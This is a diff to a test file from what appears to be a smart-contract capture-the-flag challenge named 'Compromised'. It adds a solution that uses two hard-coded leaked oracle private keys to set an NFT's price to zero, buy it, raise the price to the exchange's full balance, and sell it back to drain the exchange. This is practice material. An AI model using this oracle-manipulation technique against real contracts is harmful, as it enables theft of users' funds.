@@ -50,7 +50,20 @@ describe('Compromised challenge', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        const leakedAccounts = ['0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'].map(pk=>web3.eth.accounts.privateKeyToAccount(pk));
+
+        for (let account of leakedAccounts) {
+            await web3.eth.personal.importRawKey(account.privateKey, '');
+            web3.eth.personal.unlockAccount(account.address, '', 999999);
+            await this.oracle.postPrice('DVNFT', 0, { from: account.address });
+        }
+
+        await this.exchange.buyOne({ from: attacker, value: 1 });
+        const exchangeBalance = await balance.current(this.exchange.address);
+        await this.oracle.postPrice("DVNFT", exchangeBalance, { from: leakedAccounts[0].address});
+        await this.oracle.postPrice("DVNFT", exchangeBalance, { from: leakedAccounts[1].address});
+        await this.token.approve(this.exchange.address, 1, { from: attacker });
+        await this.exchange.sellOne(1, { from: attacker })
     });
 
     after(async function () {
